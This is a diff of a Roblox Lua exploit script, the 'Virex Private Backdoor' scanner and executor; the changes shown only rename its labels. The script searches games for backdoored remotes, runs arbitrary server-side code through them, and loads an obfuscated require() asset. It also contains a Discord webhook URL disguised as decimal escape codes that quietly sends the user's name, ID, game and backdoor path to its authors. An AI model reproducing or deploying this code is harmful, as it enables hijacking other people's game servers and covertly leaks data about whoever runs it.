@@ -1,32 +1,32 @@
 --[=[d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 88      88    88    88            odD'      88      88    88 88ooo88 88  ooo 88    88    88          .88'        88      88    88 88~~~88 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER]=]-- Instances: 33 | Scripts: 3 | Modules: 3
 local G2L = {};
--- StarterGui.Virex Private Executor Backdoor
+-- StarterGui.Virex Private Backdoor
 G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
-G2L["1"]["Name"] = [[Virex Private Executor Backdoor]];
+G2L["1"]["Name"] = [[Virex Private Backdoor]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 G2L["1"]["ResetOnSpawn"] = false;
--- StarterGui.Virex Private Executor Backdoor.Frame
+-- StarterGui.Virex Private Backdoor.Frame
 G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["2"]["BackgroundTransparency"] = 0.5;
 G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276);
 G2L["2"]["Position"] = UDim2.new(0.27320125699043274, 0, 0.3018597960472107, 0);
--- StarterGui.Virex Private Executor Backdoor.Frame.UIStroke
+-- StarterGui.Virex Private Backdoor.Frame.UIStroke
 G2L["3"] = Instance.new("UIStroke", G2L["2"]);
 G2L["3"]["Color"] = Color3.fromRGB(0, 143, 255);
--- StarterGui.Virex Private Executor Backdoor.Frame.UICorner
+-- StarterGui.Virex Private Backdoor.Frame.UICorner
 G2L["5"] = Instance.new("UICorner", G2L["2"]);
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor
+-- StarterGui.Virex Private Backdoor.Frame.Executor
 G2L["6"] = Instance.new("Folder", G2L["2"]);
 G2L["6"]["Name"] = [[Executor]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Execute
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Execute
 G2L["7"] = Instance.new("Frame", G2L["6"]);
 G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["7"]["BackgroundTransparency"] = 0.5;
 G2L["7"]["Size"] = UDim2.new(0, 290, 0, 28);
 G2L["7"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.8708109259605408, 0);
 G2L["7"]["Name"] = [[Execute]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Execute.Button
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Execute.Button
 G2L["8"] = Instance.new("TextButton", G2L["7"]);
 G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["8"]["TextSize"] = 22;
@@ -36,19 +36,19 @@ G2L["8"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["8"]["Name"] = [[Button]];
 G2L["8"]["Text"] = [[Execute]];
 G2L["8"]["BackgroundTransparency"] = 0.5;
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Execute.UICorner
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Execute.UICorner
 G2L["9"] = Instance.new("UICorner", G2L["7"]);
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Execute.UIStroke
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Execute.UIStroke
 G2L["a"] = Instance.new("UIStroke", G2L["7"]);
 G2L["a"]["Color"] = Color3.fromRGB(51, 215, 0);
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Clear
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Clear
 G2L["b"] = Instance.new("Frame", G2L["6"]);
 G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["b"]["BackgroundTransparency"] = 0.5;
 G2L["b"]["Size"] = UDim2.new(0, 162, 0, 28);
 G2L["b"]["Position"] = UDim2.new(0.6400582790374756, 0, 0.8708109855651855, 0);
 G2L["b"]["Name"] = [[Clear]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Clear.Button
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Clear.Button
 G2L["c"] = Instance.new("TextButton", G2L["b"]);
 G2L["c"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["c"]["TextSize"] = 22;
@@ -58,21 +58,21 @@ G2L["c"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["c"]["Name"] = [[Button]];
 G2L["c"]["Text"] = [[Clear]];
 G2L["c"]["BackgroundTransparency"] = 0.5;
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Clear.UICorner
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Clear.UICorner
 G2L["d"] = Instance.new("UICorner", G2L["b"]);
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.Clear.UIStroke
+-- StarterGui.Virex Private Backdoor.Frame.Executor.Clear.UIStroke
 G2L["e"] = Instance.new("UIStroke", G2L["b"]);
 G2L["e"]["Color"] = Color3.fromRGB(36, 236, 203);
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox
 G2L["f"] = Instance.new("Frame", G2L["6"]);
 G2L["f"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["f"]["BackgroundTransparency"] = 0.5;
 G2L["f"]["Size"] = UDim2.new(0, 462, 0, 163);
 G2L["f"]["Position"] = UDim2.new(0.01962907239794731, 0, 0.24310137331485748, 0);
 G2L["f"]["Name"] = [[ExecutorBox]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox.UICorner
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox.UICorner
 G2L["10"] = Instance.new("UICorner", G2L["f"]);
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox.TextBox
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox.TextBox
 G2L["11"] = Instance.new("TextBox", G2L["f"]);
 G2L["11"]["TextSize"] = 14;
 G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
@@ -88,19 +88,19 @@ G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
 G2L["11"]["Text"] = [[]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
 G2L["11"]["ClearTextOnFocus"] = false;
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
 G2L["12"] = Instance.new("LocalScript", G2L["11"]);
 G2L["12"]["Name"] = [[Highlight]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter
 G2L["13"] = Instance.new("ModuleScript", G2L["12"]);
 G2L["13"]["Name"] = [[Highlighter]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer
 G2L["14"] = Instance.new("ModuleScript", G2L["13"]);
 G2L["14"]["Name"] = [[lexer]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer.language
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer.language
 G2L["15"] = Instance.new("ModuleScript", G2L["14"]);
 G2L["15"]["Name"] = [[language]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Scanner
+-- StarterGui.Virex Private Backdoor.Frame.Scanner
 G2L["16"] = Instance.new("Frame", G2L["2"]);
 G2L["16"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["16"]["BackgroundTransparency"] = 0.5;
@@ -108,12 +108,12 @@ G2L["16"]["Size"] = UDim2.new(0, 370, 0, 107);
 G2L["16"]["Position"] = UDim2.new(0.1166670024394989, 0, 0.30478382110595703, 0);
 G2L["16"]["Visible"] = false;
 G2L["16"]["Name"] = [[Scanner]];
--- StarterGui.Virex Private Executor Backdoor.Frame.Scanner.UIStroke
+-- StarterGui.Virex Private Backdoor.Frame.Scanner.UIStroke
 G2L["17"] = Instance.new("UIStroke", G2L["16"]);
 G2L["17"]["Color"] = Color3.fromRGB(0, 143, 255);
--- StarterGui.Virex Private Executor Backdoor.Frame.Scanner.UICorner
+-- StarterGui.Virex Private Backdoor.Frame.Scanner.UICorner
 G2L["19"] = Instance.new("UICorner", G2L["16"]);
--- StarterGui.Virex Private Executor Backdoor.Frame.Scanner.Button
+-- StarterGui.Virex Private Backdoor.Frame.Scanner.Button
 G2L["1a"] = Instance.new("TextButton", G2L["16"]);
 G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["1a"]["TextSize"] = 43;
@@ -123,10 +123,10 @@ G2L["1a"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["1a"]["Name"] = [[Button]];
 G2L["1a"]["Text"] = [[Start Scanning]];
 G2L["1a"]["BackgroundTransparency"] = 0.5;
--- StarterGui.Virex Private Executor Backdoor.Frame.Scanner.Button.UIStroke
+-- StarterGui.Virex Private Backdoor.Frame.Scanner.Button.UIStroke
 G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
 G2L["1c"]["Color"] = Color3.fromRGB(0, 143, 255);
--- StarterGui.Virex Private Executor Backdoor.Frame.TextLabel
+-- StarterGui.Virex Private Backdoor.Frame.TextLabel
 G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
 G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(0, 143, 255);
 G2L["1d"]["BackgroundTransparency"] = 0.5;
@@ -134,14 +134,14 @@ G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.B
 G2L["1d"]["TextSize"] = 49;
 G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["1d"]["Size"] = UDim2.new(0, 460, 0, 50);
-G2L["1d"]["Text"] = [[Virex Private Executor Backdoor]];
+G2L["1d"]["Text"] = [[Virex Private Backdoor]];
 G2L["1d"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 0);
--- StarterGui.Virex Private Executor Backdoor.Frame.TextLabel.UIStroke
+-- StarterGui.Virex Private Backdoor.Frame.TextLabel.UIStroke
 G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
 G2L["1e"]["Color"] = Color3.fromRGB(0, 143, 255);
--- StarterGui.Virex Private Executor Backdoor.LocalScript
+-- StarterGui.Virex Private Backdoor.LocalScript
 G2L["20"] = Instance.new("LocalScript", G2L["1"]);
--- StarterGui.Virex Private Executor Backdoor.Dragify
+-- StarterGui.Virex Private Backdoor.Dragify
 G2L["21"] = Instance.new("LocalScript", G2L["1"]);
 G2L["21"]["Name"] = [[Dragify]];
 -- Require G2L wrapper
@@ -511,7 +511,7 @@ local enumLibraryTable = language.libraries.Enum
 for _, enum in ipairs(Enum:GetEnums()) do enumLibraryTable[tostring(enum)] = "Enum" end
 return language
 end;};
--- StarterGui.Virex Private Executor Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
+-- StarterGui.Virex Private Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
 local function C_12()
 	local script = G2L["12"];
 	local Highlighter = require(script.Highlighter)
@@ -523,7 +523,7 @@ local function C_12()
 	end)
 end;
 task.spawn(C_12);
--- StarterGui.Virex Private Executor Backdoor.LocalScript
+-- StarterGui.Virex Private Backdoor.LocalScript
 local function C_20()
 	local script = G2L["20"];
 	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
@@ -532,10 +532,10 @@ local function C_20()
 	alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
 	backdoor=nil
 	HttpService=game:GetService("HttpService")
-	function debug(text, lvl) local func=print;if lvl==1 then func=print end;if lvl==2 then func=error end;if lvl==3 then func=warn end;func('Virex Private Executor Backdoor: '..text) end
+	function debug(text, lvl) local func=print;if lvl==1 then func=print end;if lvl==2 then func=error end;if lvl==3 then func=warn end;func('Virex Private Backdoor: '..text) end
 	function runRemote(remote, data, data2) if remote:IsA('RemoteEvent') then remote:FireServer(data) elseif remote:IsA('RemoteFunction') then spawn(function() remote:InvokeServer(data) end) end end
 	function makeVisible(folder, state) for i,v in folder:GetDescendants() do if v:IsA('Frame') then v.Visible=state end end end
-	function notify(text) game:GetService('StarterGui'):SetCore("SendNotification",{Title="Virex Private Executor Backdoor",Duration=6,Text=text}) end
+	function notify(text) game:GetService('StarterGui'):SetCore("SendNotification",{Title="Virex Private Backdoor",Duration=6,Text=text}) end
 	if _G.LALOL_Hub_Backdoor_Logs_Disabled then notify('Logs disabled :(') end
 	makeVisible(GUI, false)
 	GUI.Scanner.Visible=true
@@ -548,7 +548,7 @@ local function C_20()
 		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
 		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			while true do code=generateName(math.random(12,30));if not remotes[code] then break end end
-			spawn(function() protected_backdoor:InvokeServer('Virex Private Executor join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+			spawn(function() protected_backdoor:InvokeServer('Virex Private join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 			remotes[code]=protected_backdoor
 		end
 		for i,remote in game:GetDescendants() do
@@ -574,7 +574,7 @@ local function C_20()
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 					runRemote(remote, "require(171016405.1884*69)")
-					runRemote(remote, "a=Instance.new('Hint')a.Text='Virex Private Executor Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					runRemote(remote, "a=Instance.new('Hint')a.Text='Virex Private Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then request({Url='\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\49\48\56\54\57\52\49\54\48\52\54\52\49\53\56\55\56\49\47\57\86\67\122\95\99\107\52\117\120\51\77\51\84\81\106\56\109\111\76\68\113\51\78\119\45\100\107\89\68\87\55\103\69\99\97\76\72\75\80\98\101\50\95\74\74\73\122\53\109\50\102\69\104\54\101\83\110\112\51\51\87\79\76\116\103\105\49',Method='POST',Headers={['Content-Type']='application/json',},Body=HttpService:JSONEncode({username='pls dont delete this w3bh00k',content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',})}) end
 					return true
@@ -589,7 +589,7 @@ local function C_20()
 		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
 		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			debug('Protected backdoor found', 3)
-			spawn(function() local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('Virex Private Executor join today!! discord.gg/XXqzxT7E5z', a) end);if variantValue~=nil then local splited=string.split(variantValue,':');notify(splited[#splited]) end end)
+			spawn(function() local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('Virex Private join today!! discord.gg/XXqzxT7E5z', a) end);if variantValue~=nil then local splited=string.split(variantValue,':');notify(splited[#splited]) end end)
 		else runRemote(backdoor, a) end
 		GUI.Executor.Execute.Button.Text='Executed!'
 		wait(0.5)
@@ -612,7 +612,7 @@ local function C_20()
 	end)
 end;
 task.spawn(C_20);
--- StarterGui.Virex Private Executor Backdoor.Dragify
+-- StarterGui.Virex Private Backdoor.Dragify
 local function C_21()
 	local script = G2L["21"];
 	local UIS = game:GetService("UserInputService")
